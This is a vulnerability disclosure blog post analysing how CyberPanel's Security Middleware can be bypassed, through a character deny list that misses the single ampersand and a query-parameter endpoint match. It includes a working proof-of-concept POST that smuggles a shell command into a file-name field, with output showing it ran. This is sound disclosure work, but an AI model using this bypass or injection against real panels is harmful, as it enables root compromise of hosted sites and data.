---
title:  "[4] CyberPanel - Security Middleware Bypass"
layout: post
author: Altion
date:   2024-01-22
last_modified_at: 2024-01-27
permalink: /posts/cyberpanel-4
categories: cyberpanel, security, research
---

In CyberPanel versions 2.1.1 through 2.3.4 the Security Middleware mechanism is making security decisions by relying on incorrect order of analysis and incomplete set of forbidden special characters.

<table>
    <tr>
        <th>OWASP Top 10</th>
        <td><a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" target="blank">A04:2021</a> – Insecure Design </td>
    </tr>
    <tr>
        <th>CWE ID</th>
        <td><a href="https://cwe.mitre.org/data/definitions/654.html" target="blank">CWE-654</a> - Reliance on a Single Factor in a Security Decision</td>
    </tr>
    <tr>
        <th>CVSS v4.0 Score</th>
        <td><a href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H" target="blank">Critical (9.5)</a></td>
    </tr>
    <tr>
        <th>Vendor URLs</th>
        <td>
            <a href="https://cyberpanel.net/" target="blank">https://cyberpanel.net/</a>
            <br />
            <a href="https://github.com/usmannasir/cyberpanel" target="blank">https://github.com/usmannasir/cyberpanel</a>
        </td>
    </tr>    
    <tr>
        <th>Affected Versions</th>
        <td>2.1.1 - 2.3.2, fixed in v2.3.5</td>
    </tr>
</table>

Attackers can exploit this vulnerability to circumvent the input validation controls implemented in the Security Middleware.

In combination with other known issues, such as [Broken Authentication and Local File Inclusion (LFI) in '/api/FetchRemoteTransferStatus' endpoint](/weblog{% post_url 2024-01-22-cyberpanel-7 %}), unauthenticated attackers can achieve remote code execution with root privileges on the CyberPanel host. Using the elevated privileges, unauthenticated adversaries can gain access to the hosted websites, their related databases and user data, as well as unrestricted access on the underlying system where CyberPanel is installed.

#### Technical Analysis

CyberPanel implements the Security Middleware mechanism to ensure that HTTP POST requests do not contain special characters. This check was done by inspecting all POST requests issued towards the application. Special characters can have particular meanings to a system shell or to the rest of the application functionality and can be used to carry out attacks such as command injection, SQL injection, directory traversal, and cross-site scripting (XSS). 

CyberPanel's security is highly dependent on the assurance provided by the Security Middleware. Specifically, all HTTP POST requests that pass the security checks implemented in the Security Middleware are treated as trusted. As a result, subsequent application functions in the execution flow will also treat the incoming data as trusted. In cases where HTTP POST requests contain forbidden special characters, the supplied data is treated as malicious, the request is not processed any further and an error message is returned. 


Traffic analysis starts by extracting the JSON data found in the HTTP POST request body. The security middleware performs analysis only on HTTP POST requests that contain JSON data. Initially on lines 63 through 77, any arrays found within the JSON object are checked against a predefined list of forbidden special characters. If the array data contain a forbidden character the request is treated as malicious and an error is returned (lines 72-77). Otherwise, execution continues in the next block of security checks. 

```python
# File: CyberCP/secMiddleware.py
...
54: if request.method == 'POST':
55:     try:
56:         #logging.writeToFile(request.body)
57:         data = json.loads(request.body)
58:         for key, value in data.items():
...         
63:             elif type(value) == list:
64:                 for items in value:
65:                     if items.find('- -') > -1 or items.find('\n') > -1 or items.find(';') > -1 or items.find(
66:                             '&&') > -1 or items.find('|') > -1 or items.find('...') > -1 \
67:                             or items.find("`") > -1 or items.find("$") > -1 or items.find(
68:                         "(") > -1 or items.find(")") > -1 \
69:                             or items.find("'") > -1 or items.find("[") > -1 or items.find(
70:                         "]") > -1 or items.find("{") > -1 or items.find("}") > -1 \
71:                             or items.find(":") > -1 or items.find("<") > -1 or items.find(">") > -1:
72:                         logging.writeToFile(request.body)
73:                         final_dic = {
74:                             'error_message': "Data supplied is not accepted, following characters are not allowed in the input ` $ & ( ) [ ] { } ; : ‘ < >.",
75:                                     "errorMessage": "Data supplied is not accepted, following characters are not allowed in the input ` $ & ( ) [ ] { } ; : ‘ < >."}
76:                                 final_json = json.dumps(final_dic)
77:                                 return HttpResponse(final_json)
...
```

The checks performed on lines 65 through 71 do not account for the single ampersand '&' character. As a result, it is possible to circumvent the above controls using JSON array payloads with a single ampersand character. In Linux systems, usage of the ampersand character at the end of a shell command causes the running job to go to the background. In this case, a single ampersand character can be used to circumvent the security mechanism and pass arbitrary system commands in HTTP POST calls where the undelying function executes a shell command.

The security middleware continues its analysis by checking the URL path of the HTTP POST request to determine whether the request has been issued towards any of the listed endpoints (lines 89-96). If the URI path contains any of the listed endpoints, the request is marked as non-malicious and no further analysis is performed.

```python
# File: CyberCP/secMiddleware.py
...
89:                     if request.build_absolute_uri().find(
90:                             'api/remoteTransfer') > -1 or request.build_absolute_uri().find(
91:                             'api/verifyConn') > -1 or request.build_absolute_uri().find(
92:                             'webhook') > -1 or request.build_absolute_uri().find(
93:                             'saveSpamAssassinConfigurations') > -1 or request.build_absolute_uri().find(
94:                             'docker') > -1 or request.build_absolute_uri().find(
95:                             'cloudAPI') > -1 or request.build_absolute_uri().find(
96:                             'verifyLogin') > -1 or request.build_absolute_uri().find('submitUserCreation') > -1:
97:                         continue
...
```

The search mechanism attempts to find a match in the URI path, however the 'request.build_absolute_uri()' returns the absolute URI including query parameters. As a result, it is possible to circumvent further analysis of any HTTP POST request by including any of the predefined endpoints in the query parameters of the request's URI.


As proof of concept, the following HTTP POST request circumvents the security middleware checks by including the `webhook` query parameter to execute the Linux 'whoami' command:

```http
POST /filemanager/controller?webhook HTTP/1.1
Host: cyberpanel:8090
Cookie: csrftoken=aDU[...]kzM2Ss; sessionid=f2[...]km
Content-Length: 183
X-Csrftoken: aDU[...]kzM2Ss
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 [...]
[...]
Connection: close

{
    "fileName": "/home/test.local/public_html/file.txt'; whoami > /tmp/uri_query_attack #",
    "method": "writeFileContents",
    "fileContent": "This is a test file.",
    "domainRandomSeed": "",
    "domainName": "test.local"
}
```

In return, CyberPanel succesfully executes the injected shell command:

```
root@cyberpanel:~# ./pspy64 
...
CMD: UID=1003 PID=46376  | lscpd (CommSocket) 
CMD: UID=1003 PID=46378  | sh -c cp /usr/local/CyberCP/tmp/5863 '/home/test.local/public_html/file.txt'; whoami > /tmp/uri_query_attack #'

root@cyberpanel:~# ll /tmp
total 132
-rw-r--r--  1 testl6262 testl6262   10 Sep 30 11:54 uri_query_attack

root@cyberpanel:~# cat /tmp/uri_query_attack 
testl6262
```

Analysis continues in the JSON parameters where if any of the paramerter values contains a forbidden character, the request is treated as malicious and an error is returned (lines 111-116). Otherwise, execution continues in the next block of security checks.

```python
# File: CyberCP/secMiddleware.py
...
104:                     if value.find('- -') > -1 or value.find('\n') > -1 or value.find(';') > -1 or value.find(
105:                             '&&') > -1 or value.find('|') > -1 or value.find('...') > -1 \
106:                             or value.find("`") > -1 or value.find("$") > -1 or value.find("(") > -1 or value.find(
107:                         ")") > -1 \
108:                             or value.find("'") > -1 or value.find("[") > -1 or value.find("]") > -1 or value.find(
109:                         "{") > -1 or value.find("}") > -1 \
110:                             or value.find(":") > -1 or value.find("<") > -1 or value.find(">") > -1:
111:                         logging.writeToFile(request.body)
112:                         final_dic = {
113:                             'error_message': "Data supplied is not accepted, following characters are not allowed in the input ` $ & ( ) [ ] { } ; : ‘ < >.",
114:                             "errorMessage": "Data supplied is not accepted, following characters are not allowed in the input ` $ & ( ) [ ] { } ; : ‘ < >."}
115:                         final_json = json.dumps(final_dic)
116:                         return HttpResponse(final_json)
...
```

The security checks performed on lines 104 admthrough 110 do not account for the single ampersand '&' character. As a result, it is possible to circumvent the above controls using payloads with a single ampersand character. In Linux systems, usage of the ampersand character at the end of a shell command causes the running job to go to the background. In this case, a single ampersand character can be used to circumvent the security mechanism and pass arbitrary system commands in HTTP POST calls where the undelying function executes a shell command.

Finally, analysis is also performed in the JSON parameters names  where if any of the values contains a forbidden character, the request is treated as malicious and an error is returned (lines 122-126):

```python
# File: CyberCP/secMiddleware.py
...
117:                     if key.find(';') > -1 or key.find('&&') > -1 or key.find('|') > -1 or key.find('...') > -1 \
118:                             or key.find("`") > -1 or key.find("$") > -1 or key.find("(") > -1 or key.find(")") > -1 \
119:                             or key.find("'") > -1 or key.find("[") > -1 or key.find("]") > -1 or key.find(
120:                         "{") > -1 or key.find("}") > -1 \
121:                             or key.find(":") > -1 or key.find("<") > -1 or key.find(">") > -1:
122:                         logging.writeToFile(request.body)
123:                         final_dic = {'error_message': "Data supplied is not accepted.",
124:                                      "errorMessage": "Data supplied is not accepted following characters are not allowed in the input ` $ & ( ) [ ] { } ; : ‘ < >."}
125:                         final_json = json.dumps(final_dic)
126:                         return HttpResponse(final_json)
...
```

The security checks performed on lines 117 through 121, however, do not account for the single ampersand '&' character. As a result, it is possible to circumvent the above controls using payloads with a single ampersand character. In Linux systems, usage of the ampersand character at the end of a shell command causes the running job to go to the background. In this case, a single ampersand character can be used to circumvent the security mechanism and pass arbitrary system commands in HTTP POST calls where the undelying function executes a shell command.

#### Further Reading

When does this end?! That was exactly my question when I found about the: [Bypass of Security Controls in 'commandInjectionCheck()'](/weblog{% post_url 2024-01-22-cyberpanel-5 %})